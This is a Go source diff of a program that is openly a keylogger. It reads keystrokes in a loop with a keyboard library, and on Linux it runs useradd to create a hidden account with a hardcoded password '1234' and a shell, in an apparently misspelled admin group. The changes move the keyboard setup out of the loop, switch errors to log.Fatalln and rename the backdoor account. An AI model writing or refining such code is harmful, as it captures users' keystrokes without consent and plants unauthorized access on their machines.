@@ -3,16 +3,17 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"log"
 	"net/http"
 	"os"
 	"os/exec"
+
 	"github.com/eiannone/keyboard"
 )
 
 func check(err error)() {
     if err != nil{
-		fmt.Println(err)
-        // os.Exit(1)
+		log.Fatalln(err)
     }
 }
 
@@ -26,8 +27,7 @@ func checkEnv() {
 	}
 
 	if operatingSystem == "linux" {
-
-		_, execerr := exec.Command("useradd", "-a", "-m", "-G", "whell", "-s", "/bin/sh", "-p", "1234", "Geno").Output()
+		_, execerr := exec.Command("useradd", "-a", "-m", "-G", "whell", "-s", "/bin/sh", "-p", "1234", "Gino").Output()
 		check(execerr)
 	}
 	
@@ -52,12 +52,13 @@ func main() {
 
     defer f.Close()
 
+	// log the keystrokes to a file
+	keyboard.Open()
+	defer keyboard.Close()
+
 	// Setup infite loop so that it continusously run
 	for true {
-		// log the keystrokes to a file
-		keyboard.Open()
-		defer keyboard.Close()
-
+		
 		key, _, err := keyboard.GetSingleKey()
 		fmt.Println(key)
 		check(err)
@@ -78,7 +79,7 @@ func main() {
 		}
 
 		if err := scanner.Err(); err != nil {
-			panic(err)
+			check(err)
 		} 
 	}
 }
